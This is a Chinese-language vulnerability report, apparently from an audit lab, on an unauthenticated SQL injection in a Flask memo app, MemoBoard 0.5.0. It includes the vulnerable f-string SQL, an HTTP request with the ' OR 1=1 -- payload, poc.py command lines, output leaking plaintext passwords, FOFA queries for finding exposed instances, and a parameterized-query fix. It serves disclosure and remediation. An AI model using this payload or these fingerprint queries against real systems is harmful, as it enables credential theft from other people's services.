---
title: "MemoBoard 未授权 SQL 注入泄露用户密码（含 admin）"
summary: "GET /api/users?name= → run_user_lookup → 字符串拼接 SQL 并返回 password"
---

# MemoBoard 未授权 SQL 注入泄露用户密码（含 admin）

## 漏洞描述

MemoBoard 是一款基于 Flask 的内网备忘录看板应用。

`GET /api/users` 无鉴权，`name` 查询参数被 `run_user_lookup` 直接拼进 SQL，且 SELECT 含 `password` 列，构成未授权 SQL 注入。

## 漏洞危害

- 已证明危害：匿名一次请求即可拖出全部用户明文密码（含 `admin/admin123`）及邮箱。
- 潜在危害：凭据可登录后台；本 sink 为单条 SQLite 语句，未验证写操作或堆叠查询。
- SQL 注入须明确：是否能获取 OS-Shell：否
- SSRF 须明确：观察面：不适用

## 漏洞厂商全称

MemoBoard（VulnHunter 白盒审计靶场项目）

## 已知受影响产品及版本

MemoBoard v0.5.0（`board/__init__.py` `__version__ = "0.5.0"`）

## 互联网资产证明
> 用于在公开资产测绘平台定位同类应用资产；优先使用应用自身稳定特征，不把漏洞路径、PoC 参数或一次性业务数据当作唯一指纹。测绘语句不允许出现「或」关系。

### 精准测绘语法

#### FOFA
```text
title="MemoBoard notes" && icon_hash="-151231234" && body="MemoBoard"
```

#### X 情报社区
```text
title="MemoBoard notes" && app="MemoBoard notes" && icon_hash="-151231234"
```

## 漏洞技术细节

### Source → Sink

- Source：`GET /api/users?name=`（`src/app.py:63` `api_users`，无 session/token）
- 传递：`name = request.args.get("name", "")` → `run_user_lookup(name)`
- Sink：`src/board/engine.py:71` `sql = f"SELECT id, name, role, email, password FROM users WHERE name = '{name}'"` → `conn.execute(sql)`，结果经 `jsonify` 原样返回

### 漏洞代码

- 完整路径：`src/board/engine.py:71`

```python
def run_user_lookup(name: str) -> list[dict]:
    # String-concatenated SQL. `name` is a query parameter.
    sql = f"SELECT id, name, role, email, password FROM users WHERE name = '{name}'"
    with _connect() as conn:
        rows = conn.execute(sql).fetchall()
    return [dict(r) for r in rows]
```

### 完整 PoC 描述

可运行脚本见同目录 `poc.py`（`python poc.py -u <目标>`；须支持 `--proxy`；输出默认英语，`--zh` 切中文）。

```http
GET /api/users?name=' OR 1=1 -- HTTP/1.1
Host: TARGET:5000
Accept: application/json
Connection: close
```

WHERE 变为恒真，响应 JSON 含全部用户的 `password` 字段。

### 触发条件

无需登录。默认配置即可；不依赖风险开关或改配置。

## 同根因受影响点

- `src/board/engine.py:71` `run_user_lookup` — 字符串拼接 SQL（代表点）
- `src/app.py:63` `api_users` — 无鉴权调用并将含 password 的结果返回

## 复现证明

### 基础环境搭建

动态环境尚未落盘，见 `docs/lab.md`。本项目验证方式为局部验证（harness）。

### 漏洞触发操作

#### 局部验证（harness）

harness 脚本（`harness.py`）在沙箱中执行结果如下（粘贴 stdout 关键输出，截取关键行）：

```text
=== Test 1: Normal query (name=alice) ===
[{'id': 1, 'name': 'alice', 'role': 'user', 'email': 'alice@memoboard.lab', 'password': 'alice123'}]
=== Test 2: SQL injection payload: ' OR 1=1 -- ===
Records returned: 3
  name=alice, password=alice123, role=user
  name=bob, password=bob123, role=user
  name=admin, password=admin123, role=admin
=== Test 4: Constructed SQL ===
SELECT id, name, role, email, password FROM users WHERE name = '' OR 1=1 --'
```

**为何 harness 能证明漏洞存在**：harness 原样复制 `run_user_lookup` 的 f-string SQL，在与应用相同 schema/种子数据的内存 SQLite 上执行 `' OR 1=1 --`。运行时返回 3 行且 `admin` 的 `password` 为 `admin123`，对应源码中未参数化且投影了 `password` 列。不是 PoC 用法说明。

#### 动态验证（靶场 PoC）

本条以 harness 确认。对已运行实例可用同目录 `poc.py` 复测：

```http
GET /api/users?name=' OR 1=1 -- HTTP/1.1
Host: TARGET:5000
Accept: application/json
Connection: close
```

```text
python poc.py -u http://TARGET:5000
python poc.py -u http://TARGET:5000 --zh
python poc.py -u http://TARGET:5000 --proxy http://127.0.0.1:8080
```

**为何 PoC 能利用该漏洞**：攻击者控制查询参数 `name`，经 `api_users` 进入 `run_user_lookup`，拼进 SELECT 后 `execute`。成功时响应 JSON 含 `admin`/`admin123`。

### 预期证据

`GET /api/users?name=' OR 1=1 --` 返回 `{"users":[...]}`，其中含 `"name":"admin","password":"admin123","role":"admin"`。

### 复现注意事项

SQLite 此处为单语句执行，本条按读出凭据证明，不要写成 OS-Shell。

## 修复方案

将 `run_user_lookup` 改为参数化查询，并从投影中去掉 `password`；为 `GET /api/users` 增加鉴权。

```python
def run_user_lookup(name: str) -> list[dict]:
    sql = "SELECT id, name, role, email FROM users WHERE name = ?"
    with _connect() as conn:
        rows = conn.execute(sql, (name,)).fetchall()
    return [dict(r) for r in rows]
```

## 备注

无。

---

## 审核标注

- 攻击面：前台
- 配置前提：默认配置
- 严重度：高危（high）
- CVSS 3.1：7.5
- 评分向量：CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
- CVSS 4.0：8.7
- CVSS 4.0 向量：CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N
- 价值分层：有 CVE 价值（cve_candidate）
- 分层理由：Unauthenticated SQL injection on a public API endpoint that leaks all users' plaintext passwords including admin credentials. Single-request exploitation, no defense, default configuration. Clear CVE-worthy impact: sensitive data leakage enabling authentication bypass and privilege escalation.
- 根因合并键：sqli:run_user_lookup
